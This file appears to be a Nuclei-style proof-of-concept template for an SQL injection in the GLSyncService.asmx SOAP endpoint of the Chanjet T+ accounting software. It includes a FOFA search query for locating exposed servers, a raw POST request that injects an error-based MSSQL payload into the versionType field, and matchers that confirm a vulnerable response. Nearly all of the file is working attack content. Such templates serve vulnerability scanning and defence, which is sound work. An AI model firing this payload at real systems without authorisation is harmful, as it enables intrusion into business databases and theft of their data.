folder-5/poc-yaml-changjie-tplus-glsyncservice-asmx-sqli.yaml

id: poc-yaml-changjie-tplus-glsyncservice-asmx-sqli
info:
  name: 畅捷通T+ GLSyncService.asmx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    fofa-query: app="畅捷通-TPlus"

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        POST /tplus/GLSyncService.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://www.chanjet.com/GetSourceAccountDataTable"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetSourceAccountDataTable xmlns="http://www.chanjet.com/">
              <versionType>' AND 9173 IN (SELECT (sys.fn_varbintohexstr(hashbytes('MD5', CAST('{{t1}}' AS VARCHAR))))) AND 'rhYc'='rhYc</versionType>
            </GetSourceAccountDataTable>
          </soap:Body>
        </soap:Envelope>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "0x{{t2}}"
      - type: word
        part: header
        words:
          - "text/xml"
      - type: regex
        regex:
          - "转换成数据类型(.*?)时失败"
          - "在将(.*?)值"
